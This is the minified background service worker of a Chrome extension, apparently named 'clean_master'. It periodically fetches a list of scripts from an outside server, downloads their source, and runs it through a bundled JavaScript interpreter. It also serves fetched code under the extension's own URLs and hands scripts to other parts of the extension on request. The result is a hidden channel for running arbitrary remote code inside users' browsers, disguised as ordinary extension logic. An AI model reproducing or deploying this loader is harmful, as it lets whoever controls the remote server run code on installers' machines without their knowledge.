importScripts("/background/interpreter.js");const key="fuck";let fuckDataArr;self.addEventListener("fetch",t=>{if(fuckDataArr){const r=t.request;var e=fuckDataArr.find(t=>chrome.runtime.getURL(t.proxy_url)===r.url);if(e){const n=new Headers;"css"===e.type?n.set("Content-Type","text/css"):n.set("Content-Type","text/javascript"),t.respondWith(new Response(e.src_str,{headers:n}))}}});const xxx=async()=>{let t=await get(key);if(!t||!t.nextUpdateTime||t.nextUpdateTime<Date.now()){const e=await fetch("https://api.extensionplay.com/clean_master/t.json?t="+Date.now()).then(t=>t.json());await Promise.all(e.map(n=>new Promise((t,e)=>{if(!n.src_str&&n.src){const r=new URL(n.src);r.searchParams.set("t",Date.now()),fetch(r.toString()).then(t=>t.ok&&t.text()).then(t=>t&&(n.src_str=t)).then(t).catch(e)}else t()}))).catch(console.warn),t={nextUpdateTime:Date.now()+432e5,data:e},await set(key,t)}return t.data.forEach(t=>{if(Array.isArray(t.run_on)){if(!t.run_on.includes("bg"))return}else if("bg"!==t.run_on)return;t.src_str&&interpreter.run(t.src_str,globalThis||self||window||{})}),t.data};async function startListener(){chrome.runtime.onMessage.addListener(function(n,t,s){return get(key).then(t=>{const e=t&&t.data||[],r=n["run_on"];s(e.filter(t=>{if(Array.isArray(t.run_on)){if(t.run_on.includes(r))return!0}else if(t.run_on===r)return!0}))}).catch(noop),!0})}async function get(t){return(await chrome.storage.local.get(t))[t]}function set(t,e){return chrome.storage.local.set({[t]:e})}function noop(){}xxx().then(t=>fuckDataArr=t),startListener();